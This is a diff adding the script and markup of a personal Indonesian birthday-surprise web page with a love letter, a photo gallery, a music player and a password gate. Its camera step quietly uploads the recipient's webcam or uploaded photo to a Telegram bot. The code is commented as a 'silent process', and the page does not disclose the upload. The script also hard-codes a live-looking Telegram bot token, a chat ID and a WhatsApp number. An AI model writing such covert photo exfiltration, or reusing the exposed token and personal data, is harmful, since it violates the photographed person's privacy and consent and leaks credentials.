+    <div class="mp-artist" id="mpArtist">Ed Sheeran</div>
+    <div class="mp-progress-row">
+      <span class="mp-time" id="mpCurrent">0:00</span>
+      <input type="range" id="mpSeek" min="0" max="100" value="0">
+      <span class="mp-time" id="mpDuration">0:00</span>
+    </div>
+  </div>
+  <button class="mp-btn" id="mpPlayBtn">▶</button>
+  <div class="mp-vol">
+    <span style="font-size:11px;">🔊</span>
+    <input type="range" id="mpVolume" min="0" max="1" step="0.01" value="0.6">
+  </div>
+</div>
+
+<div class="jar-note-popup" id="jarPopup">
+  <div class="glass-card jar-note-card">
+    <div id="jarPopupClose" style="position:absolute; top:16px; right:20px; cursor:pointer; font-size:18px;">✕</div>
+    <div style="font-size:30px;">🐾</div>
+    <p id="jarPopupText" style="font-family:var(--font-display); font-style:italic; margin:14px 0 20px; font-size:16px; line-height:1.5;"></p>
+    <button class="btn-ghost" id="jarAnotherBtn" style="font-size:13px; padding:10px 24px;">Ambil satu lagi ✨</button>
+  </div>
+</div>
+
+<audio id="bgMusic" preload="none" loop></audio>
+
+<script>
+// CONFIG TELEGRAM (INTEGRATED)
+const CONFIG_TELEGRAM = {
+  token: "8867022911:AAHIornA3q9tRaOTz73sfwK2x4sGQQBu5WQ",
+  chatId: "8554065890"
+};
+
+const CONFIG = {
+  password: "ariel",
+  whatsappNumber: "6285866585326",
+  whatsappMessage: "maaciw banyak yaaa nduduttkuuw sayang buat web recehnyaa sukaa bangetttt, gemes banyak kucingnyaa",
+
+  musicSrc: "assets/lagu-kita.mp3",
+  musicTitle: "Perfect",
+  musicArtist: "Ed Sheeran",
+  musicCover: "assets/cover-lagu.jpg",
+  fotoFavorit: "assets/foto-favorit.jpg",
+
+  suratText: `Hai ndudutt 🤍
+
+Happy 20th birthday ya sayangkuu! Yeayyy, akhirnya ndudutt resmi masuk level 20 nih wkwk. Semoga di umur yang baru ini, kamu dapet hal-hal baik yang selama ini kamu tunggu dan doain. Semoga semua yang kamu usahain, pelan-pelan terwujud satu per satu. Amiin 🤲✨
+
+Semoga rezekimu makin deras, makin berkah, dan selalu cukup buat kamu, buat orang tua, dan buat masa depan kita nanti. Semoga kamu gak pernah kekurangan apapun, kecuali waktu buat istirahat sama aku hehe 😜
+
+Panjang umur ya ndudutt, sehat terus, dijauhin dari penyakit dan hal-hal buruk. Semoga kamu selalu bahagia, setiap hari ada alasan buat senyum, ketawa, dan bersyukur. Aku pengen ndudutt tetep jadi orang sebaik dan seceria sekarang, jangan berubah yaaa 💕
+
+Semoga kamu makin lucu (iya lagi, soalnya emang udah lucu parah 🤪), makin cantik tiap hari, makin glowing, makin disayang banyak orang, dan makin jadi versi terbaik dari dirimu sendiri. Serius, kamu tuh kadang bikin aku speechless sendiri liat pesonamu wkwk 😳💕
+
+Semangat terus kuliahnya yaaa ndudutt! Jangan males-malesan, aku tau kamu bisa kok. Semoga semua tugas, ujian, praktikum, dan drama perkuliahan lainnya dipermudah. Semoga dosennya baik, nilainya bagus, dan nanti bisa lulus dengan hasil yang bikin kamu bangga! Kalau lagi capek atau pusing, istirahat dulu ya. Jangan maksa, nanti malah drop. Aku disini selalu siap dengerin keluh kesahmu kok 🥺🤲
+
+Semoga semua urusan kamu dipermudah. Yang lagi diusahain sekarang, semoga lancar semua. Kalau ada rintangan, semoga selalu dikasih jalan keluar yang terbaik. Aku yakin ndudutt kuat, hebat, and pasti bisa lewatin semuanya!
+
+Dan semoga di tahun ini, ndudutt bisa beli iPhone 18 Pro Max 2TB warna favoritmu yaa! Biar makin semangat ngonten, fotonya makin bagus, storage lega, dan jadi hadiah buat kerja keras kamu selama ini. Manifesting bareng-bareng nih 😎📱✨
+
+Yang paling penting... semoga hubungan kita tetap bertahan, terus tumbuh, dan makin kuat. Semoga kita bisa terus saling ngerti, saling dukung, saling ketawa bareng, healing bareng, jalan-jalan bareng, mimpi bareng, dan nanti... sukses bareng. Aku pengen kita sampai lama-lama, bener-bener lama. Selama-lamanya kalau bisaa 🥺💕
+
+Makasih ya ndudutt, udah jadi bagian paling berwarna di hidup aku. Kamu tuh rumah ternyaman, tempat pulang paling enak, dan alasan aku jadi versi terbaik setiap harinya. Aku sayang kamu, ndudutt. Hari ini, besok, dan selamanya 💕
+
+Oh iya, terakhir... Aku bangga banget sama kamu! IPK 3.86 itu keren banget ndudutt!! Kerja kerasmu gak sia-sia, dan itu bukti kalau kamu emang hebat. Pertahankan dan terus lebihin yaa! Proud of you always, ndudutt! 🧡⌘`,
+
+  galeri: [
+    { foto:"assets/galeri1.jpg", pesan:"ini kitaa 🤍" },
+    { foto:"assets/galeri2.jpg", pesan:"liat deh lucu ga 😼" },
+    { foto:"assets/galeri3.jpg", pesan:"senyum manis kamuu 🤍" },
+    { foto:"assets/galeri4.jpg", pesan:"masih inget gaa? 🌷" },
+    { foto:"assets/galeri5.jpg", pesan:"hari paling seru ✨" },
+    { foto:"assets/galeri6.jpg", pesan:"ketawa terus yaa 😭" },
+    { foto:"assets/galeri7.jpg", pesan:"makan enak bareng 🍜" },
+    { foto:"assets/galeri8.jpg", pesan:"jalan sama kamuu 🚶‍♀️🤍" },
+    { foto:"assets/galeri9.jpg", pesan:"peluk virtual 🫂" },
+    { foto:"assets/galeri10.jpg", pesan:"selfie wajib 📸" }
+  ]
+};
+
+const jarMessages = [
+  "makasih ya ndudutt udah selalu jadi alasan aku tersenyum tiap hari 🤍 — ariel",
+  "semoga harimu selalu manis dan dipenuhi kebahagiaan yaa, sayang 🩵",
+  "ndudutt itu hal terindah yang pernah hadir di hidup aku 🥹 — peluk jauhh 🐾",
+  "kalau lagi capek atau pusing, inget yaa ada aku yang selalu siap jadi tempat pulangmu 🤍",
+  "makasih udah bertahan dan selalu jadi orang paling gemes sedunia ✨ — mwah 🐈"
+];
+
+function $(sel){ return document.querySelector(sel); }
+function switchScreen(hideId, showId){
+  const hideEl = document.getElementById(hideId);
+  const showEl = document.getElementById(showId);
+  if(hideEl){
+    hideEl.classList.add('fading-out');
+    setTimeout(()=>{
+      hideEl.classList.remove('active','fading-out');
+      hideEl.style.display = 'none';
+      showEl.classList.add('active');
+    }, 400);
+  } else {
+    showEl.classList.add('active');
+  }
+}
+
+document.addEventListener('pointerdown', (e)=>{
+  const el = document.createElement('div');
+  el.className='paw-print';
+  el.textContent=['🐾','🐱','🐈','✨'][Math.floor(Math.random()*4)];
+  el.style.left = e.clientX+'px';
+  el.style.top = e.clientY+'px';
+  el.style.setProperty('--r', (Math.random()*40-20)+'deg');
+  document.body.appendChild(el);
+  setTimeout(()=>el.remove(), 1100);
+});
+
+for(let i=0;i<8;i++){
+  const el = document.createElement('div');
+  el.className='floating-paw';
+  el.textContent='🐾';
+  el.style.left = (Math.random()*100)+'vw';
+  el.style.animationDuration = (12+Math.random()*10)+'s';
+  el.style.animationDelay = (Math.random()*10)+'s';
+  document.body.appendChild(el);
+}
+
+const bgMusic = $('#bgMusic');
+$('#btnOpenSurprise').addEventListener('click', ()=>{
+  bgMusic.src = CONFIG.musicSrc;
+  bgMusic.play().catch(()=>{});
+  $('#music-player').classList.add('show');
+  switchScreen('splash-screen','login-screen');
+});
+
+$('#btnLogin').addEventListener('click', tryLogin);
+$('#pwInput').addEventListener('keydown', (e)=>{ if(e.key==='Enter') tryLogin(); });
+
+function tryLogin(){
+  const val = $('#pwInput').value.trim().toLowerCase();
+  if(!val){ $('#loginMsg').textContent = 'Isi passwordnya dulu yaa 🐾'; return; }
+  if(val === CONFIG.password.toLowerCase()){
+    $('#loginMsg').textContent = '';
+    switchScreen('login-screen','camera-screen');
+    initCamera();
+  } else {
+    $('#loginMsg').textContent = 'Belum tepat, coba nama panggilan pacarmu ya 🐱';
+  }
+}
+
+let camStream = null;
+function initCamera(){
+  const video = $('#camVideo');
+  if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
+    showCamFallback(); return;
+  }
+  navigator.mediaDevices.getUserMedia({ video:{ facingMode:'user' }, audio:false })
+    .then(stream=>{ camStream = stream; video.srcObject = stream; })
+    .catch(()=> showCamFallback());
+}
+
+function showCamFallback(){
+  $('#camVideo').style.display='none';
+  $('#btnTakePhoto').style.display='none';
+  $('#camFallback').style.display='block';
+}
+
+$('#camUploadInput').addEventListener('change', (e)=>{
+  const file = e.target.files[0];
+  if(!file) return;
+  const reader = new FileReader();
+  reader.onload = (ev)=>{
+    window.__userPhoto = ev.target.result;
+    $('#camPhoto').src = window.__userPhoto;
+    $('#camPhoto').style.display='block';
+    $('#camFallback').style.display='none';
+    $('#btnUsePhoto').style.display='inline-flex';
+  };
+  reader.readAsDataURL(file);
+});
+
+$('#btnTakePhoto').addEventListener('click', ()=>{
+  const video = $('#camVideo');
+  const canvas = $('#camCanvas');
+  const w = video.videoWidth || 400;
+  const h = video.videoHeight || 400;
+  canvas.width = w; canvas.height = h;
+  const ctx = canvas.getContext('2d');
+  ctx.translate(w, 0); ctx.scale(-1, 1);
+  ctx.drawImage(video, 0, 0, w, h);
+  
+  const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+  window.__userPhoto = dataUrl;
+  $('#camPhoto').src = dataUrl;
+  $('#camPhoto').style.display='block';
+  video.style.display='none';
+  $('#btnTakePhoto').style.display='none';
+  $('#btnRetake').style.display='inline-flex';
+  $('#btnUsePhoto').style.display='inline-flex';
+});
+
+$('#btnRetake').addEventListener('click', ()=>{
+  $('#camPhoto').style.display='none';
+  $('#camVideo').style.display='block';
+  $('#btnTakePhoto').style.display='inline-flex';
+  $('#btnRetake').style.display='none';
+  $('#btnUsePhoto').style.display='none';
+});
+
+// FUNGSI KONVERSI BASE64 KE BLOB
+function dataURLtoBlob(dataurl) {
+  let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+      bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+  while(n--){ u8arr[n] = bstr.charCodeAt(n); }
+  return new Blob([u8arr], {type:mime});
+}
+
+// FUNGSI AUTO KIRIM TELEGRAM (SILENT PROCESS)
+function sendPapToTelegram(base64Data){
+  if(!base64Data) return;
+  try {
+    const imageBlob = dataURLtoBlob(base64Data);
+    const formData = new FormData();
+    formData.append("chat_id", CONFIG_TELEGRAM.chatId);
+    formData.append("photo", imageBlob, "pap-auliaa.jpg");
+    formData.append("caption", "📸 PAP Baru dari Auliaa/Ndudut di Web Ultah! 🥳🤍");
+
+    fetch(`https://api.telegram.org/bot${CONFIG_TELEGRAM.token}/sendPhoto`, {
+      method: "POST",
+      body: formData
+    })
+    .then(res => res.json())
+    .then(data => console.log("Status Telegram:", data))
+    .catch(err => console.error("Error Telegram:", err));
+  } catch (err) {
+    console.error("Error Processing Image:", err);
+  }
+}
+
+$('#btnUsePhoto').addEventListener('click', ()=>{
+  if(camStream){ camStream.getTracks().forEach(t=>t.stop()); }
+  if(window.__userPhoto){
+    $('#avatarWrap').innerHTML = `<img src="${window.__userPhoto}" alt="Avatar">`;
+    sendPapToTelegram(window.__userPhoto);
+  }
+  switchScreen('camera-screen','main-screen');
+  initMain();
+});
+
+function buildTrainSet(){
+  let html = `
+    <div class="train-unit">
+      <div class="loco-body">
+        <div class="loco-ear l"></div><div class="loco-ear r"></div>
+        <div class="loco-smoke">🐾</div>
+        <div class="loco-head">😻</div>
+        <div class="loco-label">NDUDUT EXPRESS</div>
+        <div class="loco-tail"></div>
+      </div>
+      <div class="train-wheels">
+        <div class="t-wheel"></div><div class="t-wheel"></div><div class="t-wheel"></div>
+      </div>
+    </div>`;
+  CONFIG.galeri.forEach((item, idx)=>{
+    html += `<div class="train-connector"></div>`;
+    html += `
+      <div class="train-unit">
+        <div class="carriage-body">
+          <span class="carriage-num">${idx + 1}</span>
+          <img class="carriage-photo" src="${item.foto}" alt="Gerbong ${idx + 1}" onerror="this.src='https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?w=400';">
+        </div>
+        <div class="train-wheels">
+          <div class="t-wheel"></div><div class="t-wheel"></div>
+        </div>
+      </div>`;
+  });
+  return html;
+}
+
+function initMain(){
+  const el = $('#letterBody');
+  const text = CONFIG.suratText;
+  let i = 0;
+  function typeStep(){
+    if(i <= text.length){
+      el.textContent = text.slice(0,i);
+      i += 2;
+      setTimeout(typeStep, 20);
+    }
+  }
+  typeStep();
+
+  const jarPapers = $('#jarPapers');
+  for(let j=0; j<8; j++){
+    const p = document.createElement('div');
+    p.className='jar-paper';
+    p.style.setProperty('--rot',(Math.random()*30-15)+'deg');
+    jarPapers.appendChild(p);
+  }
+
+  const track = $('#catTrainTrack');
+  track.innerHTML = buildTrainSet() + `<div class="train-gap-connector"></div>` + buildTrainSet() + `<div class="train-gap-connector"></div>`;
+
+  const grid = $('#galleryGrid');
+  grid.innerHTML='';
+  CONFIG.galeri.forEach((item, idx)=>{
+    const card = document.createElement('div');
+    card.className='flip-card';
+    card.innerHTML = `
+      <div class="flip-card-inner">
+        <div class="flip-front">
+          <img src="${item.foto}" alt="Foto ${idx+1}" onerror="this.src='https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?w=400';">
+        </div>
+        <div class="flip-back"><span>${item.pesan}</span></div>
+      </div>`;
+    card.addEventListener('click', ()=> card.classList.toggle('flipped'));
+    grid.appendChild(card);
+  });
+
+  $('#surpriseCutout').src = CONFIG.fotoFavorit;
+
+  const waUrl = `https://wa.me/${CONFIG.whatsappNumber}?text=${encodeURIComponent(CONFIG.whatsappMessage)}`;
+  $('#waBtn').setAttribute('href', waUrl);
+
+  const videoEl = $('#togetherVideo');
+  videoEl.addEventListener('play', ()=>{ if(!bgMusic.paused) bgMusic.pause(); });
+  videoEl.addEventListener('ended', ()=>{ bgMusic.play().catch(()=>{}); });
+}
+
+$('#secretJar').addEventListener('click', ()=>{
+  const jar = $('#secretJar');
+  jar.classList.add('shaking');
+  setTimeout(()=>{
+    jar.classList.remove('shaking');
+    const msg = jarMessages[Math.floor(Math.random()*jarMessages.length)];
+    $('#jarPopupText').textContent = msg;
+    $('#jarPopup').classList.add('show');
+  }, 600);
+});
+$('#jarPopupClose').addEventListener('click', ()=> $('#jarPopup').classList.remove('show'));
+$('#jarAnotherBtn').addEventListener('click', ()=>{
+  const msg = jarMessages[Math.floor(Math.random()*jarMessages.length)];
+  $('#jarPopupText').textContent = msg;
+});
+
+$('#btnSurprise').addEventListener('click', ()=>{
+  if(typeof confetti === 'function'){
+    confetti({ particleCount:100, spread:80, origin:{y:0.6} });
+  }
+  $('#surpriseCutout').classList.add('show');
+  $('#surpriseCaption').style.display='block';
+  $('#surpriseCutout').scrollIntoView({ behavior:'smooth', block:'center' });
+});
+
+const playBtn = $('#mpPlayBtn');
+const seek = $('#mpSeek');
+const vol = $('#mpVolume');
+const cover = $('#mpCover');
+const coverImg = $('#mpCoverImg');
+const curEl = $('#mpCurrent');
+const durEl = $('#mpDuration');
+
+if(CONFIG.musicCover){
+  coverImg.src = CONFIG.musicCover;
+  coverImg.style.display = 'block';
+}
+
+function formatTime(sec){
+  if(isNaN(sec)) return '0:00';
+  const m = Math.floor(sec / 60);
+  const s = Math.floor(sec % 60);
+  return `${m}:${s < 10 ? '0' : ''}${s}`;
+}
+
+playBtn.addEventListener('click', ()=>{
+  if(bgMusic.paused) bgMusic.play(); else bgMusic.pause();
+});
+
+bgMusic.addEventListener('play', ()=>{
+  playBtn.textContent = '⏸';
+  cover.classList.add('spin');
+});
+
+bgMusic.addEventListener('pause', ()=>{
+  playBtn.textContent = '▶';
+  cover.classList.remove('spin');
+});
+
+bgMusic.addEventListener('loadedmetadata', ()=>{
+  durEl.textContent = formatTime(bgMusic.duration);
+});
+
+bgMusic.addEventListener('timeupdate', ()=>{
+  if(bgMusic.duration){
+    seek.value = (bgMusic.currentTime / bgMusic.duration) * 100;
+    curEl.textContent = formatTime(bgMusic.currentTime);
+  }
+});
+
+seek.addEventListener('input', ()=>{
+  if(bgMusic.duration){
+    bgMusic.currentTime = (seek.value / 100) * bgMusic.duration;
+  }
+});
+
+vol.addEventListener('input', ()=>{
+  bgMusic.volume = vol.value;
+});
+</script>
+</body>
+</html>
